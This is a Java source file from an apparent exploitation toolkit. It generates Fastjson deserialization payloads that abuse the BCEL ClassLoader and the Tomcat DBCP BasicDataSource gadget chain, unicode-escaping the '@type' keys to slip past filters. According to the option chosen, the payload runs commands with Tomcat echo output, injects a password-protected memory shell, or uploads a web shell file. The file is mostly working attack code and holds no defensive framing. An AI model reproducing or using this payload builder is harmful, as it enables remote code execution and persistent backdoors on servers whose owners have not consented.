package com.droplab.Controller.FastJson.Service;

import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.Echo.TomcatEcho;
import com.droplab.Utils.Factory.CodeFactory;
import com.droplab.Utils.Memory.MemroyFactory;
import com.droplab.Utils.ResponseUtils;
import com.droplab.service.BugService;
import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.io.File;
import java.util.Base64;
import java.util.Iterator;

public class FastJsonBCEL extends BugService {
    private final String payload = "{\"a\": {\"%s\": \"%s\",\"%s\": \"%s\"},\"b\": {\"%s\": \"%s\",\"%s\": \"%s\"},{\"x\": {\"%s\": \"%s\",\"%s\": {\"%s\": \"%s\"},\"%s\": \"%s\"}}: \"x\"}";  //parse

    @Override
    public Object run(String type) {
        try {
            if (params.size() > 0) {
                String mOption = null;
                String filepath = null;
                String filename = null;
                String mType = null;
                String mMiddle = null;
                String path = null;
                String mshellType = null;
                String password = null;
                Iterator<String> iterator = params.keySet().iterator();
                while (iterator.hasNext()) {
                    String key = iterator.next();
                    if (key.equals("filepath")) {
                        filepath = params.get(key);
                    } else if (key.equals("filename")) {
                        filename = params.get(key);
                    } else if (key.equals("mType")) {
                        mType = params.get(key);
                    }else if (key.equals("mMiddle")) {
                        mMiddle = params.get(key);
                    }else if (key.equals("path")) {
                        path = params.get(key);
                    }else if (key.equals("mshellType")) {
                        mshellType = params.get(key);
                    }else if (key.equals("password")) {
                        password = params.get(key);
                    }else if (key.equals("mOption")) {
                        mOption = params.get(key);
                    }
                }
                if (!mOption.equals("")) {
                    String format = null;
                    String code = null;
                    String memory=null;
                    switch (mOption) {
                        case "Execute":
                            if(mType.equals("Tomcat")){
                                code = TomcatEcho.instance().getTomcatEchoExecString("");
                            }else {

                            }
                            break;
                        case "MemoryShell":
                            code = TomcatEcho.instance().getTomcatEchoDefineClass("","");
                            memory = MemroyFactory.instance().getMemoryShell(mType, mMiddle, password, mshellType, path,false);
                            break;
                        case "UploadShell":
                        default:
                            if (new File(filepath).exists()) {
                                code = CodeFactory.instance().getUploadShell("","com.alibaba.fastjson.JSON", filename, new File(filepath));
                            }
                            break;
                    }
                    if (code != null) {
                        byte[] decode = Base64.getDecoder().decode(code);
                        String encode = Utility.encode(decode, true);
                        format = "$$BCEL$$" + encode;
                        String result = String.format(payload,
                                CommonUtils.string2Unicode("@type"),
                                CommonUtils.string2Unicode("java.lang.Class"),
                                CommonUtils.string2Unicode("val"),
                                CommonUtils.string2Unicode("org.apache.tomcat.dbcp.dbcp2.BasicDataSource"),
                                CommonUtils.string2Unicode("@type"),
                                CommonUtils.string2Unicode("java.lang.Class"),
                                CommonUtils.string2Unicode("val"),
                                CommonUtils.string2Unicode("com.sun.org.apache.bcel.internal.util.ClassLoader"),
                                CommonUtils.string2Unicode("@type"),
                                CommonUtils.string2Unicode("org.apache.tomcat.dbcp.dbcp2.BasicDataSource"),
                                CommonUtils.string2Unicode("driverClassLoader"),
                                CommonUtils.string2Unicode("@type"),
                                CommonUtils.string2Unicode("com.sun.org.apache.bcel.internal.util.ClassLoader"),
                                CommonUtils.string2Unicode("driverClassName"),
                                format);
                        ResponseUtils responseUtils = new ResponseUtils();
                        responseUtils.setMessage(result+"||"+memory);
                        return responseUtils;
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
